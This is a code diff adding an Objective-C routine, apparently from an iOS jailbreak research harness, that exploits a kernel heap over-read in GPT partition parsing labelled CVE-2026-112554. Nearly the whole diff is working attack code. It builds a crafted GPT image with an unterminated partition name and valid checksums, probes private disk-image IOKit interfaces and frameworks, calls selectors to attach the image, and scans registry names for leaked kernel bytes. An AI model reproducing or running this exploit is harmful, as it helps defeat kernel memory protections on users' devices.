@@ -42339,3 +42339,403 @@ void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB57: GPT Kernel Heap Leak (CVE-2026-112554)
+
+void iosurface_gpt_leak(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"=== GPT Kernel Heap Leak ===");
+        log(@"JB57: === CVE-2026-112554 — IOStorageFamily GPT Over-read ===");
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*getsvcs_fn)(unsigned int, void*, unsigned int*);
+        typedef unsigned int(*iternext_fn)(unsigned int);
+        typedef int(*regname_fn)(unsigned int, char*);
+        typedef void*(*regcreateprop_fn)(unsigned int, void*, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef void(*objrelease_fn)(unsigned int);
+        typedef unsigned long(*crc32_fn)(unsigned long, const unsigned char*, unsigned int);
+        typedef void(*cfrel_fn)(void*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        getsvcs_fn sym_getsvcs = (getsvcs_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingServices");
+        iternext_fn sym_next = (iternext_fn)dlsym(RTLD_DEFAULT, "IOIteratorNext");
+        regname_fn sym_regname = (regname_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetName");
+        regcreateprop_fn sym_createprop = (regcreateprop_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryCreateCFProperty");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        crc32_fn zcrc32 = (crc32_fn)dlsym(RTLD_DEFAULT, "crc32");
+        cfrel_fn sym_cfrel = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+
+        if (!sym_matching || !sym_getsvcs || !sym_next || !sym_regname || !sym_release) {
+            results[@"verdict"] = @"NO_SYMBOLS";
+            log(@"JB57: dlsym failed");
+            done(results);
+            return;
+        }
+        log([NSString stringWithFormat:@"JB57: dlsym OK crc32=%p", zcrc32]);
+
+        // ---- U1: IOMedia enumeration ----
+        log(@"JB57: --- U1: IOMedia scan ---");
+        unsigned int iter = 0;
+        int kr = sym_getsvcs(0, sym_matching("IOMedia"), &iter);
+        int u1_count = 0;
+        int u1_leaks = 0;
+
+        if (kr == 0 && iter) {
+            unsigned int m;
+            while ((m = sym_next(iter)) != 0 && u1_count < 64 && !isr_stopped()) {
+                char name[256] = {0};
+                sym_regname(m, name);
+                size_t len = strlen(name);
+
+                log([NSString stringWithFormat:@"JB57: U1 [%d] '%s' len=%zu", u1_count, name, len]);
+                u1_count++;
+
+                if (len > 36) {
+                    u1_leaks++;
+                    NSMutableString *hex = [NSMutableString string];
+                    for (size_t i = 36; i < len && i < 128; i++) {
+                        [hex appendFormat:@"%02x", (uint8_t)name[i]];
+                    }
+                    log([NSString stringWithFormat:@"JB57: U1 LEAK! extra_bytes=%@", hex]);
+                }
+
+                if (sym_createprop && sym_cfrel) {
+                    void *content = sym_createprop(m, (__bridge void*)@"Content", NULL);
+                    if (content) {
+                        NSString *cs = (__bridge NSString *)content;
+                        log([NSString stringWithFormat:@"JB57: U1   Content='%@'", cs]);
+                        sym_cfrel(content);
+                    }
+                }
+                sym_release(m);
+            }
+            sym_release(iter);
+        } else {
+            log([NSString stringWithFormat:@"JB57: U1 IOServiceGetMatchingServices=0x%x", kr]);
+        }
+        results[@"u1_count"] = @(u1_count);
+        results[@"u1_leaks"] = @(u1_leaks);
+        log([NSString stringWithFormat:@"JB57: U1 total=%d leaks=%d", u1_count, u1_leaks]);
+
+        // ---- U2: IOGUIDPartitionScheme scan ----
+        if (!isr_stopped()) {
+            log(@"JB57: --- U2: Partition scheme scan ---");
+            int u2_count = 0;
+            iter = 0;
+            kr = sym_getsvcs(0, sym_matching("IOGUIDPartitionScheme"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int s;
+                while ((s = sym_next(iter)) != 0 && !isr_stopped()) {
+                    char name[256] = {0};
+                    sym_regname(s, name);
+                    log([NSString stringWithFormat:@"JB57: U2 scheme='%s'", name]);
+                    u2_count++;
+                    sym_release(s);
+                }
+                sym_release(iter);
+            }
+            results[@"u2_schemes"] = @(u2_count);
+            log([NSString stringWithFormat:@"JB57: U2 schemes=%d", u2_count]);
+        }
+
+        // ---- U3: Disk image controller probe ----
+        unsigned int hdix_conn = 0;
+        NSString *hdix_class = @"NONE";
+        if (!isr_stopped()) {
+            log(@"JB57: --- U3: Disk image controller probe ---");
+            const char *cls[] = {"IOHDIXController", "IODiskImageController",
+                                 "HDIXController", "AppleDiskImageController", NULL};
+            for (int i = 0; cls[i] && !isr_stopped(); i++) {
+                unsigned int svc = sym_getmatch(0, sym_matching(cls[i]));
+                if (svc) {
+                    unsigned int c = 0;
+                    int okr = sym_open(svc, mach_task_self(), 0, &c);
+                    log([NSString stringWithFormat:@"JB57: U3 %s svc=%u open=0x%x conn=%u",
+                         cls[i], svc, okr, c]);
+                    sym_release(svc);
+                    if (okr == 0 && c) {
+                        hdix_conn = c;
+                        hdix_class = [NSString stringWithUTF8String:cls[i]];
+                        break;
+                    }
+                    hdix_class = [NSString stringWithFormat:@"%s_DENIED(0x%x)", cls[i], okr];
+                } else {
+                    log([NSString stringWithFormat:@"JB57: U3 %s not found", cls[i]]);
+                }
+            }
+        }
+        results[@"u3_hdix"] = hdix_class;
+        results[@"u3_conn"] = @(hdix_conn);
+
+        // ---- U4: DiskImages2 framework probe ----
+        if (!isr_stopped()) {
+            log(@"JB57: --- U4: DiskImages2 probe ---");
+            void *di2 = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+            if (di2) {
+                log(@"JB57: U4 DiskImages2 LOADED");
+                void *f1 = dlsym(di2, "DIAttachParamsCreate");
+                void *f2 = dlsym(di2, "DIDeviceHandleCreate");
+                void *f3 = dlsym(di2, "DIMountAttach");
+                void *f4 = dlsym(di2, "DIAttachWithParams");
+                log([NSString stringWithFormat:@"JB57: U4 AttachParams=%p Handle=%p Mount=%p Attach=%p",
+                     f1, f2, f3, f4]);
+                results[@"u4_di2"] = @"LOADED";
+            } else {
+                log(@"JB57: U4 DiskImages2 not loadable");
+                results[@"u4_di2"] = @"NO";
+            }
+            void *mk = dlopen("/System/Library/PrivateFrameworks/MediaKit.framework/MediaKit", RTLD_NOW);
+            if (mk) {
+                log(@"JB57: U4 MediaKit LOADED");
+                results[@"u4_mediakit"] = @"YES";
+            } else {
+                results[@"u4_mediakit"] = @"NO";
+            }
+        }
+
+        // ---- U5: Create crafted GPT image ----
+        int u5_created = 0;
+        NSString *imgPath = nil;
+        uint8_t *img = NULL;
+
+        if (zcrc32 && !isr_stopped()) {
+            log(@"JB57: --- U5: GPT image creation ---");
+
+            uint32_t sec_sz = 512;
+            uint32_t total_sec = 8192;
+            uint32_t img_sz = sec_sz * total_sec;
+            uint32_t nent = 8;
+            uint32_t entsz = 128;
+            uint32_t ent_sectors = (nent * entsz + sec_sz - 1) / sec_sz;
+            uint64_t first_usable = 2 + ent_sectors;
+            uint64_t last_usable = total_sec - 2 - ent_sectors;
+
+            img = calloc(1, img_sz);
+            if (img) {
+                // Protective MBR
+                img[446 + 4] = 0xEE;
+                img[446 + 8] = 1;
+                uint32_t mbrsz = total_sec - 1;
+                memcpy(img + 446 + 12, &mbrsz, 4);
+                img[510] = 0x55;
+                img[511] = 0xAA;
+
+                // GPT Header at sector 1
+                uint8_t *h = img + sec_sz;
+                memcpy(h, "EFI PART", 8);
+                uint32_t tmp32;
+                uint64_t tmp64;
+                tmp32 = 0x00010000; memcpy(h + 8, &tmp32, 4);
+                tmp32 = 92; memcpy(h + 12, &tmp32, 4);
+                tmp64 = 1; memcpy(h + 24, &tmp64, 8);
+                tmp64 = total_sec - 1; memcpy(h + 32, &tmp64, 8);
+                tmp64 = first_usable; memcpy(h + 40, &tmp64, 8);
+                tmp64 = last_usable; memcpy(h + 48, &tmp64, 8);
+                arc4random_buf(h + 56, 16);
+                tmp64 = 2; memcpy(h + 72, &tmp64, 8);
+                tmp32 = nent; memcpy(h + 80, &tmp32, 4);
+                tmp32 = entsz; memcpy(h + 84, &tmp32, 4);
+
+                // Entry 7 (last) — crafted for over-read
+                uint8_t *entries = img + 2 * sec_sz;
+                uint8_t *e = entries + 7 * entsz;
+
+                uint8_t type_guid[16] = {0xA2,0xA0,0xD0,0xEB,0xE5,0xB9,0x33,0x44,
+                                         0x87,0xC0,0x68,0xB6,0xB7,0x26,0x99,0xC7};
+                memcpy(e, type_guid, 16);
+                arc4random_buf(e + 16, 16);
+                memcpy(e + 32, &first_usable, 8);
+                memcpy(e + 40, &last_usable, 8);
+
+                // Name: 36 non-NUL UTF-16LE chars — kernel reads 72 units past end
+                for (int i = 0; i < 36; i++) {
+                    e[56 + i * 2] = 'A' + (i % 26);
+                    e[56 + i * 2 + 1] = 0;
+                }
+
+                // CRC32 entries
+                uint32_t ecrc = (uint32_t)zcrc32(0, entries, nent * entsz);
+                memcpy(h + 88, &ecrc, 4);
+
+                // CRC32 header (field zeroed first)
+                memset(h + 16, 0, 4);
+                uint32_t hcrc = (uint32_t)zcrc32(0, h, 92);
+                memcpy(h + 16, &hcrc, 4);
+
+                // Backup entry array
+                uint64_t bk_ent_start = total_sec - 1 - ent_sectors;
+                uint8_t *bk_entries = img + bk_ent_start * sec_sz;
+                memcpy(bk_entries, entries, nent * entsz);
+
+                // Backup header
+                uint8_t *bh = img + (total_sec - 1) * sec_sz;
+                memcpy(bh, h, 92);
+                tmp64 = total_sec - 1; memcpy(bh + 24, &tmp64, 8);
+                tmp64 = 1; memcpy(bh + 32, &tmp64, 8);
+                memcpy(bh + 72, &bk_ent_start, 8);
+                memset(bh + 16, 0, 4);
+                uint32_t bhcrc = (uint32_t)zcrc32(0, bh, 92);
+                memcpy(bh + 16, &bhcrc, 4);
+
+                // Write to file
+                imgPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"gpt_probe.img"];
+                NSData *imgData = [NSData dataWithBytesNoCopy:img length:img_sz freeWhenDone:NO];
+                u5_created = [imgData writeToFile:imgPath atomically:YES] ? 1 : 0;
+                log([NSString stringWithFormat:@"JB57: U5 image=%d size=%u path=%@",
+                     u5_created, img_sz, imgPath]);
+            }
+        } else {
+            log(@"JB57: U5 skipped (no crc32)");
+        }
+        results[@"u5_created"] = @(u5_created);
+
+        // ---- U6: Attachment attempts ----
+        int u6_attached = 0;
+        if (u5_created && !isr_stopped()) {
+            log(@"JB57: --- U6: Attachment attempts ---");
+
+            // U6a: Try HDIX user client if available
+            if (hdix_conn) {
+                log(@"JB57: U6a HDIX selector probe");
+                NSDictionary *attachDict = @{
+                    @"image-path": imgPath,
+                    @"image-is-raw": @YES,
+                    @"autodiskmount": @NO
+                };
+
+                NSData *xmlPlist = [NSPropertyListSerialization dataWithPropertyList:attachDict
+                    format:NSPropertyListXMLFormat_v1_0 options:0 error:nil];
+                NSData *binPlist = [NSPropertyListSerialization dataWithPropertyList:attachDict
+                    format:NSPropertyListBinaryFormat_v1_0 options:0 error:nil];
+
+                for (uint32_t sel = 0; sel <= 10 && !isr_stopped(); sel++) {
+                    uint64_t sout[8] = {0};
+                    uint32_t soutCnt = 8;
+                    uint8_t soBuf[512] = {0};
+                    size_t soSz = 512;
+
+                    int r = sym_call(hdix_conn, sel, NULL, 0,
+                                     [binPlist bytes], [binPlist length],
+                                     sout, &soutCnt, soBuf, &soSz);
+                    if (r != (int)0xe00002c2 && r != (int)0xe00002bc) {
+                        log([NSString stringWithFormat:@"JB57: U6a sel%u=0x%x outCnt=%u soSz=%zu",
+                             sel, (unsigned)r, soutCnt, soSz]);
+                        if (r == 0) u6_attached = 1;
+                    }
+                }
+
+                if (!u6_attached) {
+                    for (uint32_t sel = 0; sel <= 5 && !isr_stopped(); sel++) {
+                        uint64_t sout[8] = {0};
+                        uint32_t soutCnt = 8;
+                        uint8_t soBuf[512] = {0};
+                        size_t soSz = 512;
+
+                        int r = sym_call(hdix_conn, sel, NULL, 0,
+                                         [xmlPlist bytes], [xmlPlist length],
+                                         sout, &soutCnt, soBuf, &soSz);
+                        if (r != (int)0xe00002c2 && r != (int)0xe00002bc) {
+                            log([NSString stringWithFormat:@"JB57: U6a xml sel%u=0x%x", sel, (unsigned)r]);
+                            if (r == 0) u6_attached = 1;
+                        }
+                    }
+                }
+                sym_close(hdix_conn);
+            }
+
+            // U6b: Try DiskImages2 DIAttachWithParams
+            if (!u6_attached && !isr_stopped()) {
+                log(@"JB57: U6b DiskImages2 attempt");
+                void *di2 = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+                if (di2) {
+                    typedef void*(*di_url_create_fn)(void*, void*);
+                    typedef int(*di_attach_fn)(void*, void*, void*);
+                    di_attach_fn di_attach = (di_attach_fn)dlsym(di2, "DIAttachWithParams");
+                    if (di_attach) {
+                        NSURL *fileURL = [NSURL fileURLWithPath:imgPath];
+                        int dr = di_attach((__bridge void*)fileURL, NULL, NULL);
+                        log([NSString stringWithFormat:@"JB57: U6b DIAttach=0x%x", dr]);
+                        if (dr == 0) u6_attached = 1;
+                    } else {
+                        log(@"JB57: U6b DIAttachWithParams not found");
+                    }
+                }
+            }
+
+            // U6c: Try open() on the image as block device test
+            if (!u6_attached && !isr_stopped()) {
+                log(@"JB57: U6c direct open test");
+                int fd = open([imgPath UTF8String], O_RDONLY);
+                if (fd >= 0) {
+                    log([NSString stringWithFormat:@"JB57: U6c fd=%d (file readable)", fd]);
+                    close(fd);
+                } else {
+                    log([NSString stringWithFormat:@"JB57: U6c open failed errno=%d", errno]);
+                }
+            }
+        }
+        results[@"u6_attached"] = @(u6_attached);
+
+        // ---- U7: Post-attach leak scan ----
+        int u7_leaked = 0;
+        if (u6_attached && !isr_stopped()) {
+            log(@"JB57: --- U7: Post-attach leak scan ---");
+            usleep(500000);
+
+            iter = 0;
+            kr = sym_getsvcs(0, sym_matching("IOMedia"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int m;
+                while ((m = sym_next(iter)) != 0 && !isr_stopped()) {
+                    char name[256] = {0};
+                    sym_regname(m, name);
+                    size_t len = strlen(name);
+
+                    if (len > 36) {
+                        u7_leaked++;
+                        NSMutableString *hex = [NSMutableString string];
+                        for (size_t i = 0; i < len && i < 200; i++) {
+                            [hex appendFormat:@"%02x", (uint8_t)name[i]];
+                        }
+                        log([NSString stringWithFormat:@"JB57: U7 KERNEL LEAK len=%zu hex=%@", len, hex]);
+                    }
+                    sym_release(m);
+                }
+                sym_release(iter);
+            }
+        }
+        results[@"u7_leaked"] = @(u7_leaked);
+
+        // Cleanup
+        if (imgPath) {
+            [[NSFileManager defaultManager] removeItemAtPath:imgPath error:nil];
+        }
+        if (img) free(img);
+
+        // Verdict
+        NSString *verdict = @"NO_LEAK";
+        if (u7_leaked > 0 || u1_leaks > 0) {
+            verdict = @"KERNEL_LEAK";
+        } else if (u6_attached) {
+            verdict = @"ATTACHED_NO_LEAK";
+        } else if (hdix_conn) {
+            verdict = @"HDIX_ACCESSIBLE";
+        } else if (u5_created) {
+            verdict = @"IMAGE_CREATED";
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB57: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB57-gpt-leak-checkpoint.json", results);
+        done(results);
+    });
+}
